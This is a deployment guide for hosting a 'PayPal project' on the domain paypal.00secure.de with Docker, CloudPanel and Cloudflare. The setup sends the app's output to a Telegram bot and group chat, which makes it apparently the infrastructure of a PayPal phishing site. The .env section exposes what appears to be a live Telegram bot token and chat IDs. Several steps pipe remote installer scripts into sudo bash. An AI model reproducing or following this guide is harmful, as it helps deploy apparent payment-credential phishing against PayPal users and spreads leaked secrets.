# Complete Fail-Safe Setup Guide for PayPal Project with CloudPanel

This comprehensive guide will walk you through setting up your PayPal project from scratch on a fresh Ubuntu 22.04 server using CloudPanel, Docker, and Cloudflare.

## Part 1: Initial Server Setup

```bash
# Update your system
sudo apt update
sudo apt upgrade -y

# Install essential packages
sudo apt install -y curl wget git unzip apt-transport-https ca-certificates gnupg lsb-release

# Set up a non-root user with sudo privileges (if not already done)
sudo adduser admin
sudo usermod -aG sudo admin
# Switch to the new user
su - admin

# Configure firewall
sudo apt install -y ufw
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 8443/tcp  # For CloudPanel admin interface
sudo ufw enable
sudo ufw status
```

## Part 2: Install Docker and Docker Compose

```bash
# Install Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# Add your user to the docker group
sudo usermod -aG docker $USER
# Apply group changes (or log out and back in)
newgrp docker

# Verify Docker installation
docker --version

# Install Docker Compose
sudo apt install -y docker-compose
docker-compose --version
```

## Part 3: Install CloudPanel

```bash
# Install CloudPanel
curl -sSL https://installer.cloudpanel.io/ce/v2/install.sh | sudo bash
```

After installation, CloudPanel will be accessible at:
```
https://YOUR_SERVER_IP:8443
```

## Part 4: Initial CloudPanel Setup

1. Access CloudPanel in your browser: `https://YOUR_SERVER_IP:8443`
2. Accept the self-signed certificate warning
3. Create an admin user when prompted
4. Log in with your new admin credentials

## Part 5: Set Up Your Domain in CloudPanel

1. In CloudPanel, go to "Sites" and click "Add Site"
2. Enter your domain: `paypal.00secure.de`
3. Select "Node.js" as the application type (even though we'll use Docker)
4. Complete the site creation process

## Part 6: Clone and Configure Your Application

```bash
# Create a directory for your project
mkdir -p ~/paypal-projekt
cd ~/paypal-projekt

# Clone your repository (if using Git)
# git clone https://your-repository-url.git .
# Or upload your project files using SFTP

# Create your .env.docker file with the correct configuration
cat > .env.docker << EOF
# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=7688032599:AAG1X7dSS8S6K80Ua-vNMg29Dm-b5nj5rdU
ADMIN_CHAT_ID=7776582672
GROUP_CHAT_ID=-4612727524

# Server Configuration
PORT=3000
NODE_ENV=production
SERVER_URL=https://paypal.00secure.de
CLIENT_URL=https://paypal.00secure.de
EOF

# Make sure axios is in your package.json dependencies
if ! grep -q '"axios"' package.json; then
  npm install axios --save
fi
```

## Part 7: Configure Docker Files

### Create Dockerfile

```bash
cat > Dockerfile << 'EOF'
# Build stage for client
FROM node:20-alpine as client-builder

WORKDIR /app/client
COPY client/package*.json ./
RUN npm install --legacy-peer-deps

COPY client/ ./
RUN npm run build

# Main application stage
FROM node:20-alpine

WORKDIR /app

# Install production dependencies
COPY package*.json ./
RUN npm install

# Copy server files
COPY server/ ./server/

# Copy built client files from the builder stage
COPY --from=client-builder /app/client/dist ./client/dist

# Create data directory with proper permissions
RUN mkdir -p /app/data && chown -R node:node /app/data

# Switch to non-root user for security
USER node

# Expose the port the app will run on
EXPOSE 3000

# Start the application with environment variables from .env.docker
CMD ["node", "-r", "dotenv/config", "server/index.js"]
EOF
```

### Create docker-compose.yml

```bash
cat > docker-compose.yml << 'EOF'
version: '3'
services:
  app:
    build: .
    ports:
      - "3000:3000"
    volumes:
      - ./data:/app/data
    env_file:
      - .env.docker
    restart: always
EOF
```

## Part 8: Build and Run Your Docker Container

```bash
# Make sure you're in your project directory
cd ~/paypal-projekt

# Build and start your Docker container
docker-compose down
docker-compose up -d --build

# Verify the container is running
docker ps
docker-compose logs -f
```

## Part 9: Configure Reverse Proxy in CloudPanel

1. In CloudPanel, go to "Sites" and click on your domain
2. Click on "Vhost" in the left sidebar
3. Look for the "location /" block and replace it with:

```nginx
location / {
    proxy_pass http://localhost:3000;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection 'upgrade';
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_cache_bypass $http_upgrade;
    proxy_read_timeout 300;
    proxy_connect_timeout 300;
    proxy_send_timeout 300;
}
```

4. Save the configuration

## Part 10: Set Up SSL Certificate

1. In CloudPanel, go to "Sites" and click on your domain
2. Click on "SSL/TLS" in the left sidebar
3. Click "Request Let's Encrypt Certificate"
4. Follow the prompts to complete the SSL setup

## Part 11: Configure Cloudflare

1. Log in to your Cloudflare account
2. Select your domain
3. Go to "DNS" and ensure your A record points to your server IP
4. Go to "SSL/TLS" > "Overview"
5. Set SSL/TLS encryption mode to "Full" (not "Flexible")
6. Go to "SSL/TLS" > "Edge Certificates"
7. Enable "Always Use HTTPS"
8. Enable "Automatic HTTPS Rewrites"

## Part 12: Verify Everything is Working

```bash
# Check if your Docker container is running
docker ps

# Check Docker container logs
docker-compose logs -f

# Test your site in a browser
# Open https://paypal.00secure.de
```

## Troubleshooting

### If Docker container isn't running:
```bash
# Check Docker logs
docker-compose logs -f

# Restart the container
docker-compose down
docker-compose up -d
```

### If CloudPanel shows errors:
```bash
# Check CloudPanel logs
sudo tail -f /home/cloudpanel/logs/error.log

# Restart CloudPanel
sudo systemctl restart cloudpanel
```

### If SSL certificate setup fails:
```bash
# Check if port 80 is open (required for Let's Encrypt)
sudo lsof -i :80

# Temporarily disable Cloudflare proxy for certificate issuance
# (Turn the orange cloud gray in Cloudflare DNS settings)
```

### If Cloudflare shows 521 or 522 errors:
```bash
# Check if your site works directly with the IP
# Add a temporary entry to your local hosts file

# Verify CloudPanel's Nginx is running
sudo systemctl status clp-nginx
```

## Additional Notes

1. **Auto-start on reboot**: Docker and CloudPanel are configured to start automatically on server reboot.

2. **Backups**: CloudPanel includes a backup feature. Set up regular backups in CloudPanel > Backups.

3. **Updates**: Keep CloudPanel updated through its interface (Admin > Updates).

4. **Security**: CloudPanel includes a firewall. Configure it in CloudPanel > Firewall.

5. **Monitoring**: Monitor your server resources in CloudPanel > Dashboard.
